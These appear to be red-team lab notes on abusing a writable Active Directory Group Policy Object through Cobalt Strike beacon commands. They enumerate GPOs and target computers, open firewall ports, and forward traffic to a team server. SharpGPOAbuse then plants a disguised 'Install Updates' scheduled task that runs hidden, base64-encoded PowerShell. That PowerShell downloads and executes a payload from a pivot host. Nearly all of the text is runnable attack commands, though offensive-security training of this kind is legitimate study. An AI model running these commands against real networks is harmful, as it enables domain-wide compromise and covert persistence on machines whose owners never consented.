# Group Policy Object (GPO)

## Modify existing GPO

1. Identify GPO where current principal has modify rights

        beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

2. Resolve GPOName, Path and SID of principal

        beacon> powerpick Get-DomainGPO -Identity "CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

        beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

        beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}

3. Identify the domain OU where the above GPO applies

        beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

4. Identify the systems under the given OU

        beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

5. Setup a pivot listener (1234) on the beacon, and download & execute cradle pointing to pivot (80)

        PS> IEX ((new-object net.webclient).downloadstring("http://wkstn-2:8080/pivot"))

6. Enable inbound traffic on pivot listener (1234) and WebDrive by ports (8080) (requires system access)

        beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234
        beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 

        beacon> rportfwd 8080 127.0.0.1 80

8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system

        beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"
